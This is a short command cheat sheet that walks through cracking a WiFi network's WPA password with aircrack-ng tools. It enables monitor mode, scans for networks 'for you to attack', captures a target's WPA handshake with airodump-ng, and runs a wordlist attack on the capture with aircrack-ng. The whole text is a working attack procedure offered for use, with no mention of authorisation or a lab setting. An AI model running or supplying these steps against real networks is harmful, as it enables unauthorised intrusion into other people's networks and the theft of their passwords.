# iwconfig :
            this lists the network adaptors available and their properties. Note the name of your network adaptor that support monitoring, e.g., wlan1
# airmon-ng start wlan1
# iwconfig : 
            this will now show you wlan1mon meaning it can now be used to capture network traffic
# airodump-ng wlan1mon :
            This will search for all wifi available for you to attack. Now mark the channel and mac address of the wifi you want to attack.
# airodump-ng -c <channel-no> -w <name-of-output-file> -d <mac-address> wlan1mon : 
            This will try to capture any wpa handshake, once captured, stop it wit ctrl+c. E.g, EAPOL handshake
# aircrack-ng output-above.cap -w wordlist.txt
